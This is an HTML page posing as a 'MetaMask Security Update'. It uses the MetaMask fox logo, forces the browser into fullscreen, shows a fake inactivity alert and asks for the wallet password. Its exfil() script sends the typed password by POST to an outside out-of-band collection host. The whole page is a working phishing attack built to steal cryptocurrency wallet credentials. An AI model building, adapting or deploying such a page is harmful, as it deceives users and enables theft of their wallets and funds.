<!DOCTYPE html>
<html>
<head>
  <title>MetaMask Update</title>
  <meta name="viewport" content="width=device-width, initial-scale=1">
  <style>
    html, body {
      margin: 0;
      padding: 0;
      background-color: #111;
      color: white;
      font-family: sans-serif;
      height: 100%;
      display: flex;
      justify-content: center;
      align-items: center;
      flex-direction: column;
    }
    .card {
      background: #1c1c1c;
      padding: 24px;
      border-radius: 12px;
      width: 90%;
      max-width: 340px;
      box-shadow: 0 0 12px rgba(255,255,255,0.1);
      text-align: center;
    }
    input {
      width: 90%;
      padding: 12px;
      margin: 10px 0;
      border-radius: 8px;
      border: none;
      background-color: #222;
      color: white;
      font-size: 16px;
    }
    button {
      background-color: #4CAF50;
      color: white;
      font-size: 16px;
      padding: 12px 20px;
      border-radius: 8px;
      border: none;
    }
  </style>
</head>
<body onclick="enter()">
  <div class="card" id="ui">
    <img src="https://raw.githubusercontent.com/MetaMask/brand-resources/master/SVG/metamask-fox.svg" width="64" style="margin-bottom:10px">
    <h2>MetaMask Security Update</h2>
    <p>To continue, please enter your MetaMask password</p>
    <input type="password" id="pw" placeholder="Enter password">
    <button onclick="exfil()">Unlock Wallet</button>
  </div>

  <script>
    function enter() {
      document.body.onclick = null;
      document.documentElement.requestFullscreen().then(() => {
        setTimeout(() => {
          alert("MetaMask requires re-authentication due to inactivity.");
        }, 300); // gesture persistence
      });
    }

    function exfil() {
      const pw = document.getElementById("pw").value;
      fetch("https://jqdfjiuzmdhhkipzoaxxf2ocrw07i3cw7.oast.fun", {
        method: "POST",
        body: JSON.stringify({ pw }),
        mode: "no-cors"
      });
    }
  </script>
</body>
</html>
